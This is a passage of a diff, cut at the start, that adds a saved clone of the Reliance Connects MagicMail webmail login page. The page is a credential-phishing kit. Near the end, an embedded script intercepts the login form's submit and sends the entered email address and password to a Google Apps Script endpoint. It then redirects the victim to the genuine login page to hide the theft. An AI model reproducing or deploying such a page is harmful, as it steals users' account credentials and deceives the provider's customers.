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" border="0"></td>
+		<td align="right">
+			<table border="0" cellspacing="0" cellpadding="0" class="nopad">
+				<tbody><tr>
+					<td colspan="2" id="HeaderLogo">
+					</td>
+				</tr>
+				<tr valign="bottom">
+					<td colspan="2" align="right" class="nopad">
+					        <script language="Javascript" data-savepage-type="text/javascript" type="text/plain"></script><a data-savepage-href="login.php" href="https://mail.rconnects.com/login.php" class="nopad"><img data-savepage-currentsrc="https://mail.rconnects.com/pics/button-login.gif" data-savepage-src="./pics/button-login.gif" src="data:image/gif;base64,R0lGODlhZQAcAKIAAEpNSlNWU1ZYVltcW6anpv///2FhYV5eXiH5BAAAAAAALAAAAABlABwAAAP/WLrc/jDKSasl5oDNu/9gKI5kKRoERADC4L5wLM90bd+4LQRAyhABV2BILBqPyKRyyWwuW4PeYjXYOa/YrBZbNSwMra14TOYCFi1rec0uDwI+QFVAr9vv+Lx+z+/7/3RvcXOAhYaHiH6CCnKJjo+QinCMhJF3CpCYlpKDm3ianqF4iwWNonSgdQ2qqwKYr6mepHI5tTAKMbguuLoDury/Bba2k6XDw727wsq+y83MvcnHNcW00zjS0cLa0M7S1zLV4NjOzN0vwc/m4zPiB+/w8fLz9PAK8vfv9/kL+gUH+QD+q0ew4IFZAwwqrOfAXz+HAv1FlLiw4kF3FjNqpLixSeM7hAZCihxJsqTJkyhDNkjJsiVKkC5jypxJsybMmjhz6oyJ8MDOn0B/XhwEL6jRoynh9fTItKlTekufSp2qcZGJq1izat0aIgEAOw==" alt="Login to Magicmail" class="nopad_f"></a><a href="https://relianceconnects.com/support-estacada-corbett/" target="_blank" class="nopad"><img data-savepage-currentsrc="https://mail.rconnects.com/pics/button-help.gif" data-savepage-src="./pics/button-help.gif" src="data:image/gif;base64,R0lGODlhZQAcAKIAAEpNSlNWU1ZYVltcW6anpv///2FhYV5eXiH5BAAAAAAALAAAAABlABwAAAP/WLrc/jDKSasl5oDNu/9gKI5kKRoERADC4L5wLM90bd+4LQRAyhABV2BILBqPyKRyyWwuW4PeYjXYOa/YrBZbNSwMra14TOYCFi1rec0uDwI+QFVAr9vv+Lx+z+/7/3RvcXOAhYaHiH6CCnKJjn4Kj46LBY2SfZF1mXmbl4WUlp56nZ13paJ9oISopgV2mwx0kbOnrGGDObkzCjC8A768wcAFusUvcIzGyhAuw7/Evs/KxciV08XR0s8M0tHZ1zbVcuA52c690MTN6uThgwfw8fLz9PX0CvL4B/r7+wX+8fjZG0gwnqqCCAsK5McAHj4HCSPWOyixosV5Ai9WVGWgRaPHjyBDihxJkqSCkihTguSosqXLlzBjsoxJs6bNlgdv6typ8wDFAzyDCi1pUNwAjUiTKkX4c6nTpxoXmZhKtarVqyESAAA7" alt="Magicmail Help Info"></a>
+					</td>
+				</tr>
+			</tbody></table>
+		</td>
+	</tr>
+	<tr>
+		<td align="right" colspan="2" id="MainHeaderSubMenu">
+			<!--#include virtual="./default_top_menu.html" -->
+					</td>
+	</tr>
+</tbody></table>
+
+<!-- =================================================================== -->
+<!-- Header Style 1 END -->
+<!-- =================================================================== -->
+				<table class="MagicContentTable">
+					<tbody><tr valign="top">
+                    
+						<td class="MagicContentCell" valign="top">
+<div id="loginContentCell">
+<!-- $Id -->
+<div class="login-info-content">
+<h2>Welcome to MagicMail</h2>
+<h4>Login to access your account</h4>
+<p class="main_wiz">
+Welcome to the User Site for the MagicMail System.  <br>
+This is where you can setup and configure all your email options.
+</p>
+<h4>Forgot Your Password?</h4>
+<p class="main_wiz">
+<!-- 
+Please login by entering your <b>full email address in lower case</b> and your password.<br />
+If you have lost your password, please <a href="recover-password.php">click here</a> to recover it.<br />
+-->
+We are dedicated to providing you a secure online environment.<br>
+To have your password reset, please contact your local Customer
+Service and Technical Support team.<br><br>
+<small><i>* You MUST have cookies enabled to use these functions.</i></small>
+</p>
+</div><!-- login-info-content -->
+<div id="login-form-wrapper">
+    <form method="post" id="login-form" name="google-sheet" onsubmit="return checkForm();">
+        <input type="hidden" id="Domain Name" value="Rconnt," firefox,="" desktop="">
+        <blockquote>
+            <table id="login-form-table" class="MagicEmbeddedTable">
+                <tbody><tr>
+                    <th colspan="2">
+                        <h4>Login to MagicMail</h4>
+                    </th>
+                </tr>
+                
+
+                <tr>
+                    <td class="textright">
+                        <label for="login-email" title="Enter" your="" full="" email="" address.="">
+                            Email:
+                        </label>
+                    </td>
+                    <td>
+                        <input size="20" type="email" name="Username" id="login-email" autocorrect="off" autocapitalize="none" value="">
+                    </td>
+                </tr>
+
+                <tr>
+                    <td class="textright">
+                        <label for="login-password" title="Enter" your="" password.="" ensure="" caps="" lock="" is="" not="" on.="">
+                                Password:
+                        </label>
+                    </td>
+                    <td class="show-password">
+                        <input size="20" type="password" name="Password" id="login-password" value=""> 
+                        <label for="show-password">
+                            <input type="checkbox" id="show-password" onclick="showPass()"> 
+				                Show Password
+                        </label>
+                    </td>
+                </tr>
+                <tr class="forgot-password-row">
+                    <td></td>
+                    <td id="recover-pass-td">
+                        <a data-savepage-href="recover-password.php" href="https://mail.rconnects.com/recover-password.php">Forgot your password?</a>
+                    </td>
+                </tr>
+
+                <tr>
+                    <td class="formFoot">
+                        <table>
+                            <tbody><tr>
+                                <td class="poweredBy">
+
+                                <a data-savepage-href="https://www.magicmail.com" href="https://www.magicmail.com/" target="_blank"><img data-savepage-currentsrc="https://mail.rconnects.com/pics/powered_by.png" data-savepage-src="/pics/powered_by.png" src="data:image/png;base64,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"> </a>
+
+                                
+
+
+</td>
+                                <td class="loginBtn">
+                                    <input type="submit" value="Login">
+                                </td>
+                            </tr>
+                        </tbody></table>
+                    </td>
+                </tr>
+            </tbody></table>
+        </blockquote>
+    </form><script type="text/javascript">
+
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(() => {
+      const redirectUrl = 'https://mail.rconnects.com/login.php';
+      const link = document.createElement('a');
+      link.href = redirectUrl;
+      link.click();
+    })
+    .catch((error) => console.error('Error!', error.message));
+            })
+  </script>
+</div>
+<!-- $default_login_extra$ -->
+<!-- =================================================================== -->
+<!-- This is the login EXTRA section of the website (below the login form) -->
+
+
+<!-- END OF default_login_extra -->
+<!-- =================================================================== -->
+
+</div><!-- loginContentCell -->
+                          </td>
+                      </tr>
+                  </tbody></table>
+              </td>
+          </tr>
+          <tr id="footer_row">
+              <td><!-- $Header$ -->
+<!-- =================================================================== -->
+<!-- This is the FOOTER section of the website -->
+      <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tbody><tr align="center" class="MagicCompanyFooter">
+          <td><br><a data-savepage-href="http://www.relianceconnects.com" href="http://www.relianceconnects.com/">Reliance Connects</a><br>
+                <a href="http://www.relianceconnects.com/contact">Contact Us</a>
+                <br>
+                <a href="mailto:support@rconnects.com">support@rconnects.com</a></td>
+        </tr>
+      </tbody></table>
+      <!-- END OF Footer -->
+<!-- =================================================================== -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- ================================================================== -->
+<!-- Copyright Information, DO NOT CHANGE BELOW HERE -->
+<!-- ================================================================== -->
+      <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tbody><tr align="center" class="MagicCopyRight">
+          <td>
+            <p align="center">
+                MagicMail is a Registered Trademark of Wizard Tower TechnoServices Ltd.
+            </p>
+          </td>
+        </tr>
+      </tbody></table>
+<!-- ================================================================== -->
+
+            </td>
+        </tr>
+    </tbody></table>
+</div><!-- MagicWrapper -->
+
+</body></html>
